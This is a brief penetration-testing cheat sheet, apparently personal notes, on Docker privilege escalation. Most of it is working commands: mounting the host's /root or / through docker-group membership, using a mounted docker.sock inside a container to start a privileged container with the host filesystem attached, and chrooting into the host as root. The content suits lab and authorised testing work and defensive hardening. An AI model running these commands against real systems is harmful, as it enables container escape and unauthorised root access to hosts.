
## Docker Shared Directories

```shell
docker run -v /root:/mnt -it ubuntu
```

Any user in docker group have root equivalent privilege with shared directories.

---
## Docker Sockets

A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon.

We can use the `docker` [binary](https://master.dockerproject.com/linux/x86_64/docker) to interact with the socket and enumerate what docker containers are already running. (SEND TO CONTAINER).

```sh
ls -al ### in container
	srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock

docker -H unix:///app/docker.sock ps 
### we can control host's docker socket inside container
```

Now we can spawn a privileged container with all the host files mapped in it.

```sh
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app ### creating

/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash # run
```

If the docker.sock is writable on the host.

```sh
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash ### privileged container from host machine
```

---
## Docker Group

We need to be in docker group or have `suid` set or be in `sudoers` file for docker.

```sh
docker run -v /:/mnt --rm -it ubuntu bash
```

---